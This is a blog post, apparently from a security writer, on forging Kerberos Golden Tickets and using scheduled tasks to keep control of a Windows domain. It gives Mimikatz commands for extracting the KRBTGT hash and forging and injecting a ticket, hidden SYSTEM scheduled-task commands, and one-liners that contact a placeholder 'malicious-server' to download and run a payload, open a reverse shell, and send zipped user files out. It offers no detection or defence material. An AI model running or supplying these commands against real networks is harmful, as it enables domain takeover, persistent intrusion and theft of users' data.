---
title: 'Golden Ticket & Scheduled Tasks: Domain Persistence Through Kerberos Exploitation'
published: 2025-04-22
description: 'Deep dive into combining Golden Ticket attacks with scheduled tasks for persistent domain compromise, covering Kerberos exploitation, ticket forging, and automated persistence mechanisms'
image: ''
tags: [Windows PrivEsc]
category: 'Privilege Escalation'
draft: false 
lang: 'ar-eng'
---
```markdown
# Golden Ticket Attack and Scheduled Tasks for Persistence

## Table of Contents

- [1. The Golden Ticket Attack](#1-the-golden-ticket-attack)
  - [Key Concepts of Golden Ticket](#key-concepts-of-golden-ticket)
- [2. Scheduled Tasks as a Persistence Mechanism](#2-scheduled-tasks-as-a-persistence-mechanism)
  - [Why Scheduled Tasks Are Effective for Persistence](#why-scheduled-tasks-are-effective-for-persistence)
  - [Common Uses in Attacks](#common-uses-in-attacks)
- [3. Combining Golden Ticket with Scheduled Tasks](#3-combining-golden-ticket-with-scheduled-tasks)
  - [Step 1: Compromise and Obtain KRBTGT Hash](#step-1-compromise-and-obtain-krbtgt-hash)
  - [Step 2: Generate a Golden Ticket](#step-2-generate-a-golden-ticket)
  - [Step 3: Inject the Golden Ticket](#step-3-inject-the-golden-ticket)
  - [Step 4: Create Malicious Scheduled Tasks](#step-4-create-malicious-scheduled-tasks)
  - [Step 5: Maintain Access](#step-5-maintain-access)
- [4. Example Attack Scenarios](#4-example-attack-scenarios)
  - [Scenario 1: Deploying Malware](#scenario-1-deploying-malware)
  - [Scenario 2: Reverse Shell](#scenario-2-reverse-shell)
  - [Scenario 3: Data Exfiltration](#scenario-3-data-exfiltration)

---

## 1. The Golden Ticket Attack

The **Golden Ticket attack** is an advanced persistence and privilege escalation technique targeting Active Directory (AD) environments. It exploits the Kerberos authentication system by forging Kerberos tickets, allowing attackers to impersonate any user, including privileged accounts like **Domain Admins**.

### Key Concepts of Golden Ticket

1. **Kerberos Authentication Flow**:
   - A user requests a **Ticket Granting Ticket (TGT)** from the Key Distribution Center (KDC).
   - The KDC signs the TGT using the **KRBTGT** account's secret key (NTLM hash).
   - The user uses the TGT to request service tickets (TGS) for accessing specific resources.
2. **KRBTGT Account**:
   - The **KRBTGT** account is the cornerstone of the Kerberos protocol.
   - If the NTLM hash of this account is compromised, attackers can forge TGTs for any user.
3. **Golden Ticket Mechanics**:
   - The attacker creates a TGT with:
     - **Valid domain SID**.
     - **KRBTGT hash**.
     - **Username** (e.g., Administrator).
   - The forged ticket is indistinguishable from legitimate tickets and provides unrestricted access.
4. **Persistence**:
   - The Golden Ticket remains valid until the KRBTGT password is reset twice, making it a highly persistent attack vector.

---

## 2. Scheduled Tasks as a Persistence Mechanism

**Scheduled Tasks** in Windows allow users to automate the execution of commands or programs at specified times or events. Attackers leverage this feature to maintain persistence after gaining elevated privileges via a Golden Ticket.

### Why Scheduled Tasks Are Effective for Persistence

- **Pre-installed Feature**: No need for additional tools.
- **Flexibility**: Tasks can be configured to trigger based on time, events, or system states.
- **Stealth**: Tasks can be disguised as legitimate system tasks.
- **Persistence**: Survive reboots and user logouts.

### Common Uses in Attacks

- Deploy malware or backdoors.
- Execute reverse shells or command payloads.
- Collect and exfiltrate data.
- Disable security mechanisms.

---

## 3. Combining Golden Ticket with Scheduled Tasks

This combination is a powerful strategy for maintaining long-term control over a compromised domain. Below is the step-by-step process:

### Step 1: Compromise and Obtain KRBTGT Hash

- The attacker compromises a domain controller (DC) or extracts credentials using tools like **Mimikatz**:

  ```plaintext
  sekurlsa::krbtgt
  ```

### Step 2: Generate a Golden Ticket

- Use the KRBTGT hash to forge a Golden Ticket:

  ```plaintext
  kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:<KRBTGT_HASH> /id:500
  ```

- Save the ticket:

  ```plaintext
  kerberos::golden /export
  ```

### Step 3: Inject the Golden Ticket

- Inject the forged ticket into the current session:

  ```plaintext
  kerberos::ptt <path_to_ticket>
  ```

### Step 4: Create Malicious Scheduled Tasks

- As a privileged user, create scheduled tasks to execute malicious commands.

#### Examples

1. **Using `schtasks`**:

   ```plaintext
   schtasks /create /sc daily /tn "UpdateTask" /tr "cmd.exe /c powershell.exe -NoProfile -Command <command>" /ru "SYSTEM"
   ```

2. **Using PowerShell**:

   ```powershell
   $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command <command>"
   $trigger = New-ScheduledTaskTrigger -Daily -At 3am
   Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MaliciousTask" -User "SYSTEM"
   ```

### Step 5: Maintain Access

- Scheduled tasks ensure that the attacker’s payloads or tools are executed periodically, even if detection mechanisms remove other artifacts.

---

## 4. Example Attack Scenarios

### Scenario 1: Deploying Malware

- Download and execute malware from a remote server:

  ```powershell
  Invoke-WebRequest -Uri "http://malicious-server/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"; Start-Process "C:\Windows\Temp\payload.exe"
  ```

### Scenario 2: Reverse Shell

- Establish a reverse shell to maintain remote access:

  ```powershell
  powershell -NoProfile -Command "& {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server/shell.ps1')}"
  ```

### Scenario 3: Data Exfiltration

- Collect and exfiltrate sensitive files:

  ```powershell
  Compress-Archive -Path C:\Users\* -DestinationPath C:\Temp\data.zip
  Invoke-WebRequest -Uri "http://malicious-server/upload" -Method POST -InFile "C:\Temp\data.zip"
  ```
---

**`Happy Hacking Broo`**

---